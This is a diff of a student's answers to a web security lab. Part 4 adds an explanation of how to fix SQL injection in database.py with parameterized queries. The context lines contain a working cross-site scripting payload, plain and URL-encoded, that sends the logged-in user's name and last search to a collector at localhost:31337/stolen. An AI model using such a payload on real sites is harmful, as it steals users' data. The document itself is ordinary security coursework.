@@ -16,6 +16,7 @@ Part 1: Cross-site Scripting (XSS)
 
 	1.0) Payload (JavaScript/jQuery):
 	<script>document.addEventListener("DOMContentLoaded", function(){var url = "http://localhost:31337/stolen?user=" + document.getElementById("logged-in-user").innerText + "&last_search=" + document.getElementsByClassName("history-item list-group-item")[1].innerText; window.location.href=url},false);</script>
+	
 	1.0) No defense
 
 		http://0.0.0.0:8080/search?xssdefense=0&q=<script>document.addEventListener%28%22DOMContentLoaded%22%2C%20function%28%29%7Bvar%20url%20%3D%20%22http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%22%20%2B%20document.getElementById%28%22logged-in-user%22%29.innerText%20%2B%20%22%26last_search%3D%22%20%2B%20document.getElementsByClassName%28%22history-item%20list-group-item%22%29%5B1%5D.innerText%3B%20window.location.href%3Durl%7D%2Cfalse%29%3B</script>
@@ -117,7 +118,15 @@ Part 4: Better Defenses
 
 	4.2) Briefly describe the changes you made to database.py to prevent SQL injection attacks
 
-		TODO
+		To prevent the SQL injection attack proposed, a solution is to use a parameterized query
+		by replacing the variables(username and password) with question marks, notifying that the
+		variables are parameters. And as described in "Database Tips", "the database API can then 
+		be used to set the parameters before executing the query."
+		
+		Change the following in database.py:
+		"cur.execute("SELECT * FROM users WHERE username='{}' AND password='{}'".format(username, password))"
+		into the following:
+		"cur.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))"
 
 
 	4.3) In 1-2 paragraphs, provide some advice to the Bunglers about how they should
